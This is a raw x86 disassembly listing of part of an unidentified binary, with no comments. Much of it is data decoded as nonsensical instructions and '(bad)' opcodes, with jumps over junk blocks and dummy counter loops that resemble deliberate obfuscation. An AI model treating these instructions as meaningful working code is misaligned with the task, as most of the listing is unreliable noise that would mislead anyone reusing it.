  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4303db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	fs test esi,esi
  404a8e:	adc    DWORD PTR [edi+0x25],eax
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404add
  404a98:	int    0x65
  404a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a9b:	cmp    eax,0xd4344685
  404aa0:	rcl    DWORD PTR [ecx+edi*8],cl
  404aa3:	mov    gs,WORD PTR [ecx-0x97c064e]
  404aa9:	jo     0x404a50
  404aab:	scas   al,BYTE PTR es:[edi]
  404aac:	dec    ebx
  404aad:	addr16 es pop eax
  404ab0:	ret    
  404ab1:	adc    al,0xa9
  404ab3:	fisttp QWORD PTR [edx]
  404ab5:	inc    edx
  404ab6:	aam    0x9f
  404ab8:	(bad)  
  404ab9:	aad    0xfe
  404abb:	sbb    BYTE PTR [ecx-0x23],0x0
  404abf:	mov    esp,0x53633f7c
  404ac4:	jnp    0x404b12
  404ac6:	sbb    eax,0xaae99312
  404acb:	inc    edx
  404acc:	sub    BYTE PTR [edi],bl
  404ace:	out    0xbb,eax
  404ad0:	in     al,dx
  404ad1:	xor    DWORD PTR [edi],esp
  404ad3:	scas   eax,DWORD PTR es:[di]
  404ad5:	dec    edx
  404ad6:	fs loop 0x404b00
  404ad9:	jae    0x404b57
  404adb:	lea    esp,[esi+0x7c7eb689]
  404ae1:	enter  0x9178,0x43
  404ae5:	in     eax,0x19
  404ae7:	mov    dh,0x1f
  404ae9:	daa    
  404aea:	das    
  404aeb:	adc    al,0xc6
  404aed:	daa    
  404aee:	push   es
  404aef:	xchg   BYTE PTR [edi+0x20acd6c9],al
  404af5:	or     ecx,DWORD PTR [eax+0x7c9b55a8]
  404afb:	or     ch,BYTE PTR [ebx+0x5e]
  404afe:	outs   dx,BYTE PTR ds:[esi]
  404aff:	jnp    0x404b50
  404b01:	or     DWORD PTR [ebp+esi*1+0x979476b],edi
  404b08:	pop    ebp
  404b09:	mov    DWORD PTR [edx-0x3d],esi
  404b0c:	sub    esi,eax
  404b0e:	xor    bh,BYTE PTR [esi+0x3c089d8e]
  404b14:	mov    ch,bh
  404b16:	shr    BYTE PTR [eax+0x50],0xa
  404b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b1b:	jg     0x404abf
  404b1d:	ret    0x155d
  404b20:	lock mov dl,al
  404b23:	lahf   
  404b24:	add    cl,0xef
  404b27:	sbb    BYTE PTR [ebx+0x5],al
  404b2a:	xchg   ecx,eax
  404b2b:	ret    0x23ba
  404b2e:	fwait
  404b2f:	adc    dl,BYTE PTR [esi+eiz*2-0x17]
  404b33:	mov    gs,WORD PTR [ecx+ebp*8-0x482eefa8]
  404b3a:	jne    0x404b95
  404b3c:	dec    esp
  404b3d:	cmp    bl,BYTE PTR [edx]
  404b3f:	xor    DWORD PTR [ebx],ebp
  404b41:	xor    ecx,ebp
  404b43:	aad    0x34
  404b45:	or     edx,eax
  404b47:	cmp    BYTE PTR [edi],cl
  404b49:	dec    ebp
  404b4a:	xchg   DWORD PTR [ecx],ebx
  404b4c:	stc    
  404b4d:	or     BYTE PTR [ebx+0x62],0x7
  404b51:	popf   
  404b52:	aas    
  404b53:	bound  esi,QWORD PTR [esi+0x54]
  404b56:	pop    esp
  404b57:	jle    0x404b76
  404b59:	mov    eax,0xe5b67e4a
  404b5e:	sbb    eax,0xeda48335
  404b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b64:	out    0x86,eax
  404b66:	jbe    0x404af7
  404b68:	mov    WORD PTR [ebp+0x1b43518b],ds
  404b6e:	mov    dl,cl
  404b70:	jo     0x404b1f
  404b72:	push   esi
  404b73:	adc    al,0xa6
  404b75:	dec    ecx
  404b76:	xchg   DWORD PTR [ecx],edx
  404b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b79:	stos   BYTE PTR es:[edi],al
  404b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b7b:	fadd   DWORD PTR [ebp+0x33]
  404b7e:	jmp    0x404b6d
  404b80:	aaa    
  404b81:	push   0xa4ca7ff1
  404b86:	mov    ebx,0x906a1ba0
  404b8b:	mov    dh,0x8b
  404b8d:	sub    edi,ebp
  404b8f:	push   eax
  404b90:	imul   ecx,ebx,0xffffffba
  404b93:	sub    ecx,esi
  404b95:	xchg   edi,eax
  404b96:	jge    0x404bf3
  404b98:	int3   
  404b99:	mov    ch,0x9d
  404b9b:	call   esi
  404b9d:	cmp    al,BYTE PTR [esi+0x26]
  404ba0:	xchg   DWORD PTR [edi],esi
  404ba2:	mov    esp,0xe7f78de9
  404ba7:	aad    0x4a
  404ba9:	stos   DWORD PTR es:[edi],eax
  404baa:	dec    ecx
  404bab:	(bad)  
  404bac:	sub    DWORD PTR [eax-0x7c],edi
  404baf:	jge    0x404c05
  404bb1:	mov    al,gs:0x55e142b8
  404bb7:	cdq    
  404bb8:	in     al,dx
  404bb9:	pop    esp
  404bba:	xchg   DWORD PTR [ecx],ebx
  404bbc:	xchg   DWORD PTR [ebp-0xc254473],edi
  404bc2:	(bad)  
  404bc3:	push   ss
  404bc4:	jg     0x404bfc
  404bc6:	ror    DWORD PTR [eax-0x3ad050d0],0x3
  404bcd:	(bad)
  404bd0:	out    0xb3,eax
  404bd2:	xchg   ebp,eax
  404bd3:	(bad)  
  404bd4:	das    
  404bd5:	clc    
  404bd6:	sbb    al,0xcd
  404bd8:	hlt    
  404bd9:	add    eax,0xa0d6ef81
  404bde:	sub    al,al
  404be0:	inc    eax
  404be1:	lea    eax,[eax+0x34]
  404be4:	jmp    0x404c29
  404be6:	shl    BYTE PTR [ebp+0x33],cl
  404be9:	sub    eax,ebp
  404beb:	cmp    eax,0xdad71245
  404bf0:	inc    edi
  404bf1:	sub    eax,0x64b4d4dc
  404bf6:	cli    
  404bf7:	and    DWORD PTR [edi],0x2eb0028c
  404bfd:	ret    0x8fed
  404c00:	into   
  404c01:	mov    ecx,esi
  404c03:	pop    es
  404c04:	(bad)  
  404c05:	into   
  404c06:	xor    DWORD PTR [ebx],0xffffff9f
  404c09:	hlt    
  404c0a:	xchg   ecx,eax
  404c0b:	and    ecx,DWORD PTR [eax+ebx*8+0x51]
  404c0f:	jnp    0x404c63
  404c11:	pop    es
  404c12:	call   0xc371df1d
  404c17:	and    BYTE PTR [ecx+0x2f],bl
  404c1a:	leave  
  404c1b:	sub    DWORD PTR [ebx+edx*1],edi
  404c1e:	scas   al,BYTE PTR es:[edi]
  404c1f:	ss pop ds
  404c21:	loope  0x404c67
  404c23:	les    edx,FWORD PTR [ebp-0x1671a6d2]
  404c29:	not    BYTE PTR [edx-0x76]
  404c2c:	pushf  
  404c2d:	aam    0x26
  404c2f:	mov    ebx,0x450c1f43
  404c34:	and    eax,0xb3fa7e3b
  404c39:	mov    bl,0xa6
  404c3b:	(bad)  [ecx+0x43]
  404c3e:	and    bl,dh
  404c40:	push   edx
  404c41:	fwait
  404c42:	add    ebx,edx
  404c44:	sbb    BYTE PTR [eax-0x3b9cec8],ah
  404c4a:	test   eax,0x1884d399
  404c4f:	fiadd  DWORD PTR [eax]
  404c51:	popa   
  404c52:	mov    BYTE PTR [ebx-0x4011c27b],bl
  404c58:	and    ch,BYTE PTR [edx+0x7dc439d]
  404c5e:	cmc    
  404c5f:	sbb    BYTE PTR [ecx],bh
  404c61:	xchg   DWORD PTR [ecx+ecx*8],ecx
  404c64:	int3   
  404c65:	enter  0xd2b3,0xdc
  404c69:	cmp    eax,0x9c41886
  404c6e:	xor    ch,bh
  404c70:	xchg   DWORD PTR [esi+0x63],ebx
  404c73:	add    DWORD PTR [esi+ebp*2-0x64d0ad64],edx
  404c7a:	mov    al,ds:0xca6fcfa4
  404c7f:	inc    BYTE PTR [ebp-0xfa9c061]
  404c85:	dec    eax
  404c86:	push   ss
  404c87:	adc    BYTE PTR [ebp-0x54],0x44
  404c8b:	loope  0x404cbe
  404c8d:	pop    ds
  404c8e:	sub    al,BYTE PTR [ecx-0x6d]
  404c91:	ror    DWORD PTR [edi-0x11],1
  404c94:	xchg   ch,ch
  404c96:	out    dx,al
  404c97:	sub    cl,cl
  404c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c9a:	push   ebp
  404c9b:	sub    dl,0x71
  404c9e:	cli    
  404c9f:	inc    esp
  404ca0:	pop    es
  404ca1:	xchg   ebx,eax
  404ca2:	pop    ecx
  404ca3:	pop    edi
  404ca4:	lock in al,dx
  404ca6:	add    DWORD PTR [ecx-0x1eff99b6],ebx
  404cac:	inc    ebp
  404cad:	pusha  
  404cae:	xchg   BYTE PTR [ebp+0x6cf17357],al
  404cb4:	dec    ecx
  404cb5:	aas    
  404cb6:	cmp    DWORD PTR ds:0x5c0efc60,ebp
  404cbc:	sub    al,0x31
  404cbe:	and    DWORD PTR [ebp+0x18add575],edi
  404cc4:	and    dh,BYTE PTR [eax+0x607669a2]
  404cca:	or     bl,ch
  404ccc:	cmp    BYTE PTR [eax],dh
  404cce:	stos   DWORD PTR es:[edi],eax
  404ccf:	aad    0xc1
  404cd1:	retf   
  404cd2:	stos   DWORD PTR es:[edi],eax
  404cd3:	inc    ebp
  404cd4:	ret    
  404cd5:	mov    ebp,0xd78e69bf
  404cda:	mov    gs,WORD PTR [ebx+0x3e7864a]
  404ce0:	jg     0x404c64
  404ce2:	idiv   BYTE PTR [edx]
  404ce4:	neg    BYTE PTR [ecx-0x3b]
  404ce7:	mov    al,ds:0x3eb3cc1a
  404cec:	or     DWORD PTR [esi],ecx
  404cee:	push   bx
  404cf0:	jmp    0xbb9c:0xc8ab0906
  404cf7:	xchg   DWORD PTR [edi],ebx
  404cf9:	aam    0x28
  404cfb:	inc    ebx
  404cfc:	repnz repz fiadd WORD PTR [ecx+0x3ed17064]
  404d04:	std    
  404d05:	jne    0x404ca1
  404d07:	push   esi
  404d08:	add    al,0x82
  404d0a:	ins    BYTE PTR es:[edi],dx
  404d0b:	sbb    DWORD PTR [edi+eax*2],ecx
  404d0e:	jnp    0x404c9c
  404d10:	retf   
  404d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d12:	jnp    0x404d1b
  404d14:	xor    al,0xab
  404d16:	sub    al,BYTE PTR [esi]
  404d18:	or     eax,DWORD PTR [edx]
  404d1a:	gs pop ss
  404d1c:	adc    bl,al
  404d1e:	aas    
  404d1f:	mov    bh,0xbe
  404d21:	call   0x6b515089
  404d26:	ss jae 0x404d7e
  404d29:	mov    ebp,0x7bf212d3
  404d2e:	add    bh,BYTE PTR [edi-0x1e700615]
  404d34:	dec    edx
  404d35:	xor    bh,dh
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x77c618d5
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404dad
  404d6a:	cmp    ch,cl
  404d6c:	mov    WORD PTR [edx+ebp*4-0x64],?
  404d70:	mov    al,ds:0xf544e315
  404d75:	jnp    0x404d69
  404d77:	cld    
  404d78:	inc    ecx
  404d79:	adc    ecx,edi
  404d7b:	fstp   TBYTE PTR [ebp+0x4e0a5386]
  404d81:	jle    0x404e02
  404d83:	mov    dl,0xdc
  404d85:	adc    al,0xad
  404d87:	cmp    al,0x29
  404d89:	cmp    DWORD PTR [ebp-0x4c],ebx
  404d8c:	or     DWORD PTR fs:[ebx],0x20a4574b
  404d93:	xchg   ecx,eax
  404d94:	and    eax,0xa31fd079
  404d99:	scas   al,BYTE PTR es:[edi]
  404d9a:	in     eax,0x44
  404d9c:	into   
  404d9d:	inc    ebx
  404d9e:	push   0xfdccb218
  404da3:	(bad)  
  404da4:	cmp    DWORD PTR [edx+0x4b],ebp
  404da7:	pop    DWORD PTR ds:0x5b53d7bf
  404dad:	ds in  eax,dx
  404daf:	push   ebx
  404db0:	fistp  QWORD PTR [ebx+edi*1+0x45]
  404db4:	(bad)  
  404db5:	jg     0x404e0b
  404db7:	dec    edi
  404db8:	cli    
  404db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dba:	imul   esp,DWORD PTR [eax+edx*8],0x60
  404dbe:	jb     0x404da0
  404dc0:	lock aam 0xe0
  404dc3:	cli    
  404dc4:	test   eax,0x80cb14c3
  404dc9:	inc    esi
  404dca:	lock cs mov eax,0xae532a98
  404dd1:	icebp  
  404dd2:	test   al,0x21
  404dd4:	jg     0x404dc1
  404dd6:	and    BYTE PTR [edx+ecx*2+0x69a680e4],bh
  404ddd:	inc    esp
  404dde:	loop   0x404d8e
  404de0:	std    
  404de1:	daa    
  404de2:	stos   DWORD PTR es:[edi],eax
  404de3:	iret   
  404de4:	aam    0x18
  404de6:	lock mov esi,0x7d824adc
  404dec:	mov    ah,0x4a
  404dee:	mov    cl,0x9b
  404df0:	add    eax,0x34fccd92
  404df5:	sbb    bh,BYTE PTR [ebp+0x50]
  404df8:	stos   DWORD PTR es:[edi],eax
  404df9:	pop    ecx
  404dfa:	mov    ebp,DWORD PTR [ecx-0x14]
  404dfd:	loopne 0x404d8b
  404dff:	cmp    eax,0x5ddfa92d
  404e04:	(bad)  
  404e05:	in     eax,dx
  404e06:	push   edi
  404e07:	jmp    0x22412d68
  404e0c:	test   al,0xc8
  404e0e:	push   ecx
  404e0f:	mov    eax,0xc83ef1fd
  404e14:	lds    esp,FWORD PTR [edi]
  404e16:	jecxz  0x404e73
  404e18:	xchg   DWORD PTR [eax],esp
  404e1a:	arpl   WORD PTR [esi],dx
  404e1c:	fsub   DWORD PTR [ebx-0xa77b879]
  404e22:	mov    DWORD PTR [edi+ebx*4],ecx
  404e25:	std    
  404e26:	or     al,0x83
  404e28:	add    BYTE PTR [ecx+0x28],cl
  404e2b:	pushf  
  404e2c:	inc    edx
  404e2d:	ret    
  404e2e:	fbstp  TBYTE PTR [eax]
  404e30:	not    edx
  404e32:	(bad)  
  404e33:	fs ins BYTE PTR es:[edi],dx
  404e35:	fs mov ecx,0x4abab1c
  404e3b:	mov    ebx,0x3b1e2ea0
  404e40:	mov    ch,0xd4
  404e42:	add    DWORD PTR [esi+0x47],esp
  404e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e46:	cmp    dh,BYTE PTR [ecx-0x4671bcc0]
  404e4c:	pop    ss
  404e4d:	ret    
  404e4e:	clc    
  404e4f:	fucomi st,st(3)
  404e51:	lea    ecx,[edx-0x6c188e63]
  404e57:	adc    ebp,ebp
  404e59:	(bad)  
  404e5a:	popa   
  404e5b:	jbe    0x404ea3
  404e5d:	mov    ss,edi
  404e5f:	rol    DWORD PTR [edx],cl
  404e61:	imul   esi,DWORD PTR [edx+0x14],0xdc9fc084
  404e68:	jnp    0x404e41
  404e6a:	cmp    BYTE PTR [eax+esi*1-0x2be8011c],bl
  404e71:	add    eax,0xdb834b74
  404e76:	sbb    esi,DWORD PTR [ebx+0x5c]
  404e79:	xchg   esi,eax
  404e7a:	cmp    ah,0xc2
  404e7d:	mov    esp,0x5d061e8b
  404e82:	mov    eax,0x71501413
  404e87:	dec    edi
  404e88:	stc    
  404e89:	xlat   BYTE PTR ds:[ebx]
  404e8a:	xor    DWORD PTR ds:0xa3b1a1f8,0xf3a9c1ac
  404e94:	shl    BYTE PTR [eax],cl
  404e96:	imul   ecx,DWORD PTR ds:0x3abd704,0x58
  404e9d:	pop    eax
  404e9e:	mov    cl,0xd3
  404ea0:	jno    0x404e8e
  404ea2:	and    DWORD PTR [ebx-0x717f60a8],ebp
  404ea8:	xchg   ebp,eax
  404ea9:	xchg   ebp,eax
  404eaa:	fcomp  QWORD PTR [bx+di-0x74]
  404eae:	mov    esi,ds
  404eb0:	adc    ch,ah
  404eb2:	hlt    
  404eb3:	maxps  xmm4,XMMWORD PTR [ebp-0x24]
  404eb7:	sbb    DWORD PTR [edi-0x6ceb26e1],ecx
  404ebd:	push   0x9e5f010b
  404ec2:	ss pusha 
  404ec4:	dec    esi
  404ec5:	add    bl,BYTE PTR [edx+edx*4-0x23613436]
  404ecc:	mov    bh,0x5e
  404ece:	and    BYTE PTR [ebx],bl
  404ed0:	mov    al,0x6b
  404ed2:	inc    ebx
  404ed3:	mov    eax,ds:0x4926cc43
  404ed8:	stos   BYTE PTR es:[edi],al
  404ed9:	mov    eax,0xf38b3634
  404ede:	ins    DWORD PTR es:[edi],dx
  404edf:	adc    BYTE PTR [ecx+0x602f89a2],bl
  404ee5:	cli    
  404ee6:	dec    ebp
  404ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ee8:	dec    ebx
  404ee9:	xchg   ebp,eax
  404eea:	or     ecx,DWORD PTR [edx-0x740bf358]
  404ef0:	push   eax
  404ef1:	push   esp
  404ef2:	popa   
  404ef3:	out    0xf4,al
  404ef5:	pop    ebx
  404ef6:	shl    eax,1
  404ef8:	jecxz  0x404f75
  404efa:	cmp    al,0xec
  404efc:	mov    ds:0xa469eeb8,al
  404f01:	sbb    BYTE PTR [ebx+0x1d6ba553],bh
  404f07:	xchg   edx,eax
  404f08:	popa   
  404f09:	xchg   ebp,eax
  404f0a:	xlat   BYTE PTR ds:[ebx]
  404f0b:	xchg   esi,eax
  404f0c:	xchg   BYTE PTR [edx-0x75],al
  404f0f:	pop    edx
  404f10:	push   ebx
  404f11:	mov    cl,0x60
  404f13:	lock int3 
  404f15:	adc    DWORD PTR [eax+ecx*1-0x41],edi
  404f19:	retf   
  404f1a:	sbb    DWORD PTR [ecx],eax
  404f1c:	adc    eax,0xd105cd11
  404f21:	clc    
  404f22:	add    ecx,DWORD PTR [edi+0x4a]
  404f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f26:	pop    ds
  404f27:	bound  ebx,QWORD PTR [edx-0xf]
  404f2a:	dec    eax
  404f2b:	inc    ebp
  404f2c:	mov    bl,0xdc
  404f2e:	test   al,0xef
  404f30:	pop    ds
  404f31:	mov    ch,0x8
  404f33:	aad    0xcc
  404f35:	add    DWORD PTR [ecx+eax*8+0x3e],edi
  404f39:	out    dx,al
  404f3a:	or     esp,esp
  404f3c:	arpl   WORD PTR [ecx-0xb],bp
  404f3f:	push   es
  404f40:	mov    al,BYTE PTR [ecx-0x449fed54]
  404f46:	pushf  
  404f47:	jne    0x404f54
  404f49:	mov    dh,0xbe
  404f4b:	test   al,0x61
  404f4d:	jp     0x404f58
  404f4f:	inc    BYTE PTR [ebx]
  404f51:	xchg   esi,eax
  404f52:	mov    al,ds:0x79174ced
  404f57:	vsqrtss xmm0,xmm6,DWORD PTR [ecx+0x43035925]
  404f5f:	add    BYTE PTR [eax],al
  404f61:	add    BYTE PTR [eax],al
  404f63:	add    cl,ch
  404f65:	or     eax,DWORD PTR [eax]
  404f67:	add    BYTE PTR [eax],al
  404f69:	mov    eax,ds:0x430359
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430359,eax
  404f74:	cmp    DWORD PTR ds:0x430359,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430359,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e6d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e99f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ecd7
  404faf:	xor    edx,DWORD PTR ds:0x430351
  404fb5:	mov    DWORD PTR ds:0x42ecd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ed69
  404fc8:	mov    eax,ds:0x42e883
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e6d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43034d
  404fe2:	mov    DWORD PTR ds:0x42e6d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ecf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ecf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ecf3,ecx
  405002:	cmp    DWORD PTR ds:0x42ecf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e8d3
  405018:	cmp    DWORD PTR ds:0x42ecf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ecf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ecf3,ecx
  405034:	cmp    DWORD PTR ds:0x42ecf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	loopne 0x405007
  405054:	inc    edx
  405055:	cld    
  405056:	(bad)  
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x404ffe
  40505f:	popf   
  405060:	imul   ebp,DWORD PTR [esi-0x6c],0x2c
  405064:	std    
  405065:	es hlt 
  405067:	push   ecx
  405068:	lods   eax,DWORD PTR ds:[esi]
  405069:	or     al,0x7f
  40506b:	mov    dh,0xf6
  40506d:	cmc    
  40506e:	mov    edx,0xbea0c280
  405073:	xlat   BYTE PTR ds:[ebx]
  405074:	repz in al,0xe2
  405077:	scas   al,BYTE PTR es:[edi]
  405078:	(bad)  
  405079:	jle    0x405019
  40507b:	out    0x59,al
  40507d:	push   eax
  40507e:	adc    BYTE PTR [ebx+ebp*1+0xe95b508],cl
  405085:	jmp    0xc231:0x11d72f02
  40508c:	adc    eax,0xb2d73854
  405091:	(bad)  
  405092:	mov    ebp,0x83adc44
  405097:	mov    esp,0x33eca910
  40509c:	adc    al,0xb6
  40509e:	sbb    esi,DWORD PTR [edx-0x3e26cd78]
  4050a4:	inc    edi
  4050a5:	sub    eax,0x2a6bb0ba
  4050aa:	int    0x97
  4050ac:	cmp    al,0xf1
  4050ae:	or     DWORD PTR [ebx+0x4c42b881],ebx
  4050b4:	xor    eax,0xadb9cbde
  4050b9:	adc    DWORD PTR [ecx+ebp*4],edx
  4050bc:	jns    0x405063
  4050be:	xchg   esp,eax
  4050bf:	and    bh,BYTE PTR [esi]
  4050c1:	in     al,0x15
  4050c3:	and    al,0x0
  4050c5:	call   0xfdbdf718
  4050ca:	int    0x58
  4050cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050cd:	inc    eax
  4050ce:	repz shr BYTE PTR [ebx+0xb],0x7d
  4050d3:	std    
  4050d4:	add    DWORD PTR [ebp-0x7e],ebp
  4050d7:	or     eax,0x9b1ff40f
  4050dc:	pop    esi
  4050dd:	es sbb eax,0x62e0304e
  4050e3:	cmp    dh,bh
  4050e5:	cmp    ebx,DWORD PTR [ebp-0x2f1a3ca6]
  4050eb:	adc    eax,esi
  4050ed:	les    ecx,FWORD PTR [esp+edi*4-0x3bdf1fe5]
  4050f4:	xor    DWORD PTR [eax+0x30],eax
  4050f7:	(bad)  
  4050f8:	ds mov edi,0xe7075442
  4050fe:	test   BYTE PTR [ecx+eiz*1-0x799d5623],dh
  405105:	adc    BYTE PTR [edi-0x4a],0x78
  405109:	loopne 0x4050ce
  40510b:	xchg   esp,eax
  40510c:	mov    ecx,0xc256f1a
  405111:	lods   al,BYTE PTR ds:[esi]
  405112:	gs adc al,0xaa
  405115:	imul   ebp,DWORD PTR [ebx+esi*1+0x23b98be6],0x32
  40511d:	stos   BYTE PTR es:[edi],al
  40511e:	jnp    0x40518d
  405120:	fldenv [edi]
  405122:	push   edx
  405123:	or     BYTE PTR [ebx-0x66beee14],dl
  405129:	stos   DWORD PTR es:[edi],eax
  40512a:	cmp    esi,edi
  40512c:	call   0x3902:0x2dcda83a
  405133:	popa   
  405134:	rol    DWORD PTR [edi-0x7a],0xae
  405138:	cmp    al,0xaa
  40513a:	push   esi
  40513b:	stc    
  40513c:	test   DWORD PTR [eax+0x5755e35],0xd8e8410d
  405146:	sub    ch,BYTE PTR [eax]
  405148:	rcr    DWORD PTR [edx],0xda
  40514b:	dec    edx
  40514c:	push   0xcc101e07
  405151:	fisttp DWORD PTR gs:[ecx]
  405154:	jle    0x40514e
  405156:	or     al,0x6
  405158:	int    0x18
  40515a:	stos   DWORD PTR es:[edi],eax
  40515b:	jnp    0x405125
  40515d:	mov    dh,0x70
  40515f:	mov    cl,0x9
  405161:	arpl   WORD PTR [ebx+eax*8],cx
  405164:	or     eax,0xfa33c83d
  405169:	imul   edi,DWORD PTR [edi],0xac7eac10
  40516f:	inc    esi
  405170:	jae    0x40510b
  405172:	out    dx,eax
  405173:	lods   eax,DWORD PTR ds:[esi]
  405174:	stos   DWORD PTR es:[edi],eax
  405175:	or     al,0x3a
  405177:	enter  0xe244,0x2a
  40517b:	test   DWORD PTR ds:0xf22a0f9,ebx
  405181:	mov    DWORD PTR [eax],edi
  405183:	pop    edi
  405184:	inc    esp
  405185:	test   BYTE PTR [edx+0x40],0x8c
  405189:	adc    eax,0x2b2b506f
  40518e:	push   ds
  40518f:	push   es
  405190:	cdq    
  405191:	xor    ah,BYTE PTR [esi+0x391d4133]
  405197:	cmc    
  405198:	fld    QWORD PTR [ebp+esi*8-0x225e09c6]
  40519f:	fld    QWORD PTR [ecx-0x4e115ecf]
  4051a5:	xchg   DWORD PTR [edx+0x31],esi
  4051a8:	pop    ds
  4051a9:	shr    BYTE PTR [esi+0x18923892],cl
  4051af:	add    al,0xbf
  4051b1:	xor    BYTE PTR ss:[eax+0x69f14ed8],0x5a
  4051b9:	rcl    ebp,1
  4051bb:	mov    eax,0x34364d7f
  4051c0:	call   FWORD PTR [esi-0x65]
  4051c3:	ds xchg ebp,eax
  4051c5:	data16 stc 
  4051c7:	mov    ah,0x78
  4051c9:	xchg   ebx,eax
  4051ca:	pop    ds
  4051cb:	loop   0x405186
  4051cd:	iret   
  4051ce:	jne    0x405243
  4051d0:	lods   al,BYTE PTR ds:[esi]
  4051d1:	unpckhps xmm2,XMMWORD PTR [ebx+ebx*8+0x70]
  4051d6:	cmp    ebx,DWORD PTR [ebp-0x4d]
  4051d9:	mov    eax,ds:0x46f8cdfd
  4051de:	lea    esp,[ebx-0x79]
  4051e1:	stc    
  4051e2:	dec    ebx
  4051e3:	mov    esp,0x333a9a7d
  4051e8:	adc    al,bl
  4051ea:	in     eax,dx
  4051eb:	cmp    DWORD PTR [edx-0x37],ebp
  4051ee:	xchg   ebx,eax
  4051ef:	loope  0x40525e
  4051f1:	in     eax,0x3e
  4051f3:	mov    dl,al
  4051f5:	mov    bh,0x8c
  4051f7:	jnp    0x405203
  4051f9:	xor    eax,ecx
  4051fb:	pop    ss
  4051fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051fd:	inc    eax
  4051fe:	mov    ebx,0x9a0a020a
  405203:	xchg   ebp,eax
  405204:	cdq    
  405205:	sar    DWORD PTR ds:0x58fcd167,0x8e
  40520c:	mov    ah,0x1b
  40520e:	jo     0x405211
  405210:	in     eax,dx
  405211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405212:	mov    al,ds:0x2b929c73
  405217:	stos   DWORD PTR es:[edi],eax
  405218:	int3   
  405219:	lds    eax,FWORD PTR [eax+0x4d]
  40521c:	inc    edx
  40521d:	(bad)  
  40521e:	test   DWORD PTR [ecx+0x7c839723],0xe8f642fc
  405228:	dec    ebx
  405229:	pop    edi
  40522a:	loopne 0x4052a4
